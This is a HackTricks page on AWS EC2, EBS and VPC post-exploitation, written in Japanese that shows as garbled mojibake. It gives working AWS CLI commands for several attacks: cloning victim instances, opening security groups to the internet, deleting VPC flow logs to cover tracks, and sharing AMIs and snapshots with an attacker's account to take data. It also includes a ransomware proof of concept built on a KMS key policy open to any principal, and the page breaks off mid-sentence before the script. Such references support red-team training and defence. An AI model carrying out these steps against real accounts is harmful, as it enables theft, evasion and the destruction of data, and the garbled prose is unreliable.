# AWS - EC2, EBS, SSM & VPC ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## EC2 & VPC

è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **æ‚ªæ„ã®ã‚ã‚‹VPCãƒŸãƒ©ãƒ¼ -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPCãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ãƒŸãƒ©ãƒ¼ãƒªãƒ³ã‚°ã¯ã€**VPCå†…ã®EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãŸã‚ã«ã€ã‚¤ãƒ³ãƒã‚¦ãƒ³ãƒ‰ãŠã‚ˆã³ã‚¢ã‚¦ãƒˆãƒã‚¦ãƒ³ãƒ‰ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’è¤‡è£½ã—ã¾ã™**ã€‚ã“ã‚Œã¯ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹è‡ªä½“ã«ä½•ã‚‚ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã›ã‚“ã€‚ã“ã®è¤‡è£½ã•ã‚ŒãŸãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã¯ã€ä¸€èˆ¬çš„ã«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¾µå…¥æ¤œçŸ¥ã‚·ã‚¹ãƒ†ãƒ ï¼ˆIDSï¼‰ãªã©ã«é€ä¿¡ã•ã‚Œã€åˆ†æãŠã‚ˆã³ç›£è¦–ã•ã‚Œã¾ã™ã€‚\
æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦ã€ã™ã¹ã¦ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã€ãã“ã‹ã‚‰æ©Ÿå¯†æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

è©³ç´°ã«ã¤ã„ã¦ã¯ã€ã“ã®ãƒšãƒ¼ã‚¸ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### å®Ÿè¡Œä¸­ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ã‚³ãƒ”ãƒ¼

ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã¯é€šå¸¸ã€ä½•ã‚‰ã‹ã®æ©Ÿå¯†æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚å†…éƒ¨ã«å…¥ã‚‹æ–¹æ³•ã¯ã„ãã¤ã‹ã‚ã‚Šã¾ã™ï¼ˆ[EC2ç‰¹æ¨©æ˜‡æ ¼ãƒˆãƒªãƒƒã‚¯](../../aws-privilege-escalation/aws-ec2-privesc.md)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼‰ã€‚ãŸã ã—ã€å«ã¾ã‚Œã¦ã„ã‚‹å†…å®¹ã‚’ç¢ºèªã™ã‚‹åˆ¥ã®æ–¹æ³•ã¯ã€**AMIã‚’ä½œæˆã—ã€ãã‚Œã‹ã‚‰æ–°ã—ã„ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã™ï¼ˆè‡ªåˆ†ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§ã‚ã£ã¦ã‚‚ï¼‰**ï¼š
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆãƒ€ãƒ³ãƒ—

**ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã¯ãƒœãƒªãƒ¥ãƒ¼ãƒ ã®ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—**ã§ã‚ã‚Šã€é€šå¸¸ã¯**æ©Ÿå¯†æƒ…å ±**ã‚’å«ã‚“ã§ã„ã‚‹ãŸã‚ã€ã“ã‚Œã‚‰ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã§ã“ã®æƒ…å ±ãŒæ˜ã‚‰ã‹ã«ãªã‚‹ã¯ãšã§ã™ã€‚\
**ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã®ãªã„ãƒœãƒªãƒ¥ãƒ¼ãƒ **ã‚’è¦‹ã¤ã‘ãŸå ´åˆã¯ã€**ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’ä½œæˆ**ã—ã€æ¬¡ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ã‹ã€å˜ã«**ã‚¢ã‚«ã‚¦ãƒ³ãƒˆå†…ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ãƒã‚¦ãƒ³ãƒˆ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### ãƒ‡ãƒ¼ã‚¿ã®æµå‡º

#### DNS æµå‡º

EC2ã‚’ãƒ­ãƒƒã‚¯ãƒ€ã‚¦ãƒ³ã—ã¦ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ãŒå¤–ã«å‡ºã‚‰ã‚Œãªã„ã‚ˆã†ã«ã—ã¦ã‚‚ã€**DNSçµŒç”±ã§æµå‡ºã™ã‚‹**å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

* **VPCãƒ•ãƒ­ãƒ¼ãƒ­ã‚°ã¯ã“ã‚Œã‚’è¨˜éŒ²ã—ã¾ã›ã‚“**ã€‚
* AWS DNSãƒ­ã‚°ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
*   ã“ã‚Œã‚’ç„¡åŠ¹ã«ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§ "enableDnsSupport" ã‚’ false ã«è¨­å®šã—ã¾ã™ï¼š

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### API ã‚³ãƒ¼ãƒ«ã«ã‚ˆã‚‹æµå‡º

æ”»æ’ƒè€…ã¯ã€è‡ªèº«ãŒç®¡ç†ã™ã‚‹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚Cloudtrailã¯ã“ã‚Œã‚‰ã®å‘¼ã³å‡ºã—ã‚’ãƒ­ã‚°ã«è¨˜éŒ²ã—ã€æ”»æ’ƒè€…ã¯Cloudtrailãƒ­ã‚°ã§æµå‡ºã—ãŸãƒ‡ãƒ¼ã‚¿ã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ã‚ªãƒ¼ãƒ—ãƒ³ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚°ãƒ«ãƒ¼ãƒ—

æ¬¡ã®ã‚ˆã†ã«ãƒãƒ¼ãƒˆã‚’é–‹ãã“ã¨ã§ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã¸ã®ã•ã‚‰ãªã‚‹ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### ECSã¸ã®ç‰¹æ¨©æ˜‡æ ¼

EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’å®Ÿè¡Œã—ã€ãã‚Œã‚’ECSã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ç™»éŒ²ã—ã€ãã®å¾ŒECSã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒ‡ãƒ¼ã‚¿ã‚’ç›—ã‚€ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

[**è©³ç´°ã«ã¤ã„ã¦ã¯ã“ã“ã‚’ç¢ºèªã—ã¦ãã ã•ã„**](../../aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs)ã€‚

### VPCãƒ•ãƒ­ãƒ¼ãƒ­ã‚°ã®å‰Šé™¤
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### AMIã‚’å…±æœ‰ã™ã‚‹

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### å…¬é–‹ãŠã‚ˆã³ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆ AMI ã§ã®æ©Ÿå¯†æƒ…å ±ã®æ¤œç´¢

* [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel ã¯ **å…¬é–‹ã¾ãŸã¯ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã® Amazon Machine Images (AMIs) å†…ã®æ©Ÿå¯†æƒ…å ±ã‚’æ¤œç´¢ã™ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸãƒ„ãƒ¼ãƒ«** ã§ã™ã€‚ã‚¿ãƒ¼ã‚²ãƒƒãƒˆ AMI ã‹ã‚‰ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’èµ·å‹•ã—ã€ãã®ãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚’ãƒã‚¦ãƒ³ãƒˆã—ã€æ½œåœ¨çš„ãªç§˜å¯†ã‚„æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã™ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã‚’è‡ªå‹•åŒ–ã—ã¾ã™ã€‚

### EBS ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã®å…±æœ‰

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### EBS ãƒ©ãƒ³ã‚µãƒ ã‚¦ã‚§ã‚¢ PoC

S3 ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ãƒãƒ¼ãƒˆã§ç¤ºã•ã‚ŒãŸãƒ©ãƒ³ã‚µãƒ ã‚¦ã‚§ã‚¢ãƒ‡ãƒ¢ã«ä¼¼ãŸæ¦‚å¿µå®Ÿè¨¼ã€‚KMSã¯ã€ã•ã¾ã–ã¾ãªAWSã‚µãƒ¼ãƒ“ã‚¹ã‚’æš—å·åŒ–ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã®ãŒç°¡å˜ã§ã‚ã‚‹ã“ã¨ã‹ã‚‰ã€Ransomware Management Serviceï¼ˆRMSï¼‰ã«åå‰ã‚’å¤‰æ›´ã™ã‚‹ã¹ãã§ã™ã€‚

ã¾ãšã€ã€Œæ”»æ’ƒè€…ã€AWSã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰KMSã«ã‚«ã‚¹ã‚¿ãƒãƒ¼ãƒãƒãƒ¼ã‚¸ãƒ‰ã‚­ãƒ¼ã‚’ä½œæˆã—ã¾ã™ã€‚ã“ã®ä¾‹ã§ã¯ã€AWSãŒç§ã®ãŸã‚ã«ã‚­ãƒ¼ã®ãƒ‡ãƒ¼ã‚¿ã‚’ç®¡ç†ã—ã¾ã™ãŒã€ç¾å®Ÿçš„ãªã‚·ãƒŠãƒªã‚ªã§ã¯æ‚ªæ„ã®ã‚ã‚‹ã‚¢ã‚¯ã‚¿ãƒ¼ãŒAWSã®ç®¡ç†å¤–ã§ã‚­ãƒ¼ã®ãƒ‡ãƒ¼ã‚¿ã‚’ä¿æŒã—ã¾ã™ã€‚ã‚­ãƒ¼ã®ãƒãƒªã‚·ãƒ¼ã‚’å¤‰æ›´ã—ã¦ã€ä»»æ„ã®AWSã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ãŒã‚­ãƒ¼ã‚’ä½¿ç”¨ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ã“ã®ã‚­ãƒ¼ã®ãƒãƒªã‚·ãƒ¼ã§ã¯ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®åå‰ã¯ã€ŒAttackSimã€ã§ã€ã™ã¹ã¦ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹ãƒãƒªã‚·ãƒ¼ãƒ«ãƒ¼ãƒ«ã¯ã€ŒOutside Encryptionã€ã¨å‘¼ã°ã‚Œã¦ã„ã¾ã™ã€‚
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
The key policy rule needs the following enabled to allow for the ability to use it to encrypt an EBS volume:

* `kms:CreateGrant`
* `kms:Decrypt`
* `kms:DescribeKey`
* `kms:GenerateDataKeyWithoutPlainText`
* `kms:ReEncrypt`

Now with the publicly accessible key to use. We can use a 'victim' account that has some EC2 instances spun up with unencrypted EBS volumes attached. This 'victim' account's EBS volumes are what we're targeting for encryption, this attack is under the assumed breach of a high-privilege AWS account.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

S3ãƒ©ãƒ³ã‚µãƒ ã‚¦ã‚§ã‚¢ã®ä¾‹ã¨åŒæ§˜ã«ã€ã“ã®æ”»æ’ƒã¯ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦æ¥ç¶šã•ã‚ŒãŸEBSãƒœãƒªãƒ¥ãƒ¼ãƒ ã®ã‚³ãƒ”ãƒ¼ã‚’ä½œæˆã—ã€'attacker'ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰ã®å…¬é–‹éµã‚’ä½¿ç”¨ã—ã¦æ–°ã—ã„EBSãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚’æš—å·åŒ–ã—ã€å…ƒã®EBSãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚’EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‹ã‚‰åˆ‡ã‚Šé›¢ã—ã¦å‰Šé™¤ã—ã€æœ€å¾Œã«æ–°ã—ãæš—å·åŒ–ã•ã‚ŒãŸEBSãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚’ä½œæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚ŒãŸã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’å‰Šé™¤ã—ã¾ã™ã€‚ ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

ã“ã‚Œã«ã‚ˆã‚Šã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«æ®‹ã‚‹ã®ã¯æš—å·åŒ–ã•ã‚ŒãŸEBSãƒœãƒªãƒ¥ãƒ¼ãƒ ã®ã¿ã¨ãªã‚Šã¾ã™ã€‚

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

ã¾ãŸã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯å…ƒã®EBSãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚’åˆ‡ã‚Šé›¢ã—ã¦å‰Šé™¤ã™ã‚‹ãŸã‚ã«EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’åœæ­¢ã—ã¾ã—ãŸã€‚å…ƒã®æš—å·åŒ–ã•ã‚Œã¦ã„ãªã„ãƒœãƒªãƒ¥ãƒ¼ãƒ ã¯ã‚‚ã†ã‚ã‚Šã¾ã›ã‚“ã€‚

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

æ¬¡ã«ã€'attacker'ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ã‚­ãƒ¼ ãƒãƒªã‚·ãƒ¼ã«æˆ»ã‚Šã€ã‚­ãƒ¼ ãƒãƒªã‚·ãƒ¼ã‹ã‚‰ã€ŒOutside Encryptionã€ãƒãƒªã‚·ãƒ¼ ãƒ«ãƒ¼ãƒ«ã‚’å‰Šé™¤ã—ã¾ã™ã€‚
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
å°‘ã—å¾…ã£ã¦ã€æ–°ã—ãè¨­å®šã—ãŸã‚­ãƒ¼ ãƒãƒªã‚·ãƒ¼ãŒä¼æ’­ã™ã‚‹ã®ã‚’å¾…ã¡ã¾ã™ã€‚ãã®å¾Œã€ã€Œè¢«å®³è€…ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«æˆ»ã‚Šã€æ–°ã—ãæš—å·åŒ–ã•ã‚ŒãŸ EBS ãƒœãƒªãƒ¥ãƒ¼ãƒ ã® 1 ã¤ã‚’ã‚¢ã‚¿ãƒƒãƒã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚ãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚’ã‚¢ã‚¿ãƒƒãƒã§ãã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

ã—ã‹ã—ã€æš—å·åŒ–ã•ã‚ŒãŸ EBS ãƒœãƒªãƒ¥ãƒ¼ãƒ ã§ EC2 ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’å®Ÿéš›ã«å†èµ·å‹•ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€å¤±æ•—ã—ã€ã€Œä¿ç•™ä¸­ã€çŠ¶æ…‹ã‹ã‚‰ã€Œåœæ­¢ã€çŠ¶æ…‹ã«æ°¸é ã«æˆ»ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚¢ã‚¿ãƒƒãƒã•ã‚ŒãŸ EBS ãƒœãƒªãƒ¥ãƒ¼ãƒ ãŒã‚­ãƒ¼ ãƒãƒªã‚·ãƒ¼ãŒã‚‚ã¯ã‚„è¨±å¯ã—ã¦ã„ãªã„ãŸã‚ã€ã‚­ãƒ¼ã‚’ä½¿ç”¨ã—ã¦å¾©å·åŒ–ã§ããªã„ã‹ã‚‰ã§ã™ã€‚

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

ã“ã‚ŒãŒä½¿ç”¨ã•ã‚Œã‚‹ Python ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™ã€‚ã“ã‚Œã¯ã€Œè¢«å®³è€…ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã® AWS ã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ã¨ã€æš—å·åŒ–ã«ä½¿ç”¨ã•ã‚Œã‚‹ã‚­ãƒ¼ã®å…¬é–‹åˆ©ç”¨å¯èƒ½ãª AWS ARN å€¤ã‚’å–å¾—ã—ã¾ã™ã€‚ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆ AWS ã‚¢ã‚«ã‚¦ãƒ³ãƒˆå†…ã®ã™ã¹ã¦ã® EC2 ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã‚¢ã‚¿ãƒƒãƒã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã® EBS ãƒœãƒªãƒ¥ãƒ¼ãƒ ã®æš—å·åŒ–ã•ã‚ŒãŸã‚³ãƒ”ãƒ¼ã‚’ä½œæˆã—ã€ãã®å¾Œã€ã™ã¹ã¦ã® EC2 ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’åœæ­¢ã—ã€å…ƒã® EBS ãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚’ãƒ‡ã‚¿ãƒƒãƒã—ã€ãã‚Œã‚‰ã‚’å‰Šé™¤ã—ã€æœ€å¾Œã«ãƒ—ãƒ­ã‚»ã‚¹ä¸­ã«ä½¿ç”¨ã•ã‚ŒãŸã™ã¹ã¦ã®ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’å‰Šé™¤ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã€Œè¢«å®³è€…ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã¯æš—å·åŒ–ã•ã‚ŒãŸ EBS ãƒœãƒªãƒ¥ãƒ¼ãƒ ã®ã¿ãŒæ®‹ã‚Šã¾ã™ã€‚ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ãƒ†ã‚¹ãƒˆç’°å¢ƒã§ã®ã¿ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯ç ´å£Šçš„ã§ã‚ã‚Šã€ã™ã¹ã¦ã®å…ƒã® EBS ãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚’å‰Šé™¤ã—ã¾ã™ã€‚ä½¿ç”¨ã•ã‚ŒãŸ 